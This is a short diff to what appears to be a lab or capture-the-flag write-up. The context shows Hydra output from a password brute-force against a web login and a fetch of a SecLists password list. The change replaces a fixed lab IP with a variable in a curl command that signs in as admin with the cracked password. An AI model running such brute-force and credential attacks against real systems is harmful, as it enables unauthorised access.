@@ -41,4 +41,4 @@ curl "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords
 # 1 of 1 target successfully completed, 1 valid password found
 # Hydra (http://www.thc.org/thc-hydra) finished at 2018-04-19 01:21:41
 
-curl "http://10.0.2.15/index.php?page=signin&username=admin&password=shadow&Login=Login#"
+curl "http://$IP/index.php?page=signin&username=admin&password=shadow&Login=Login#"
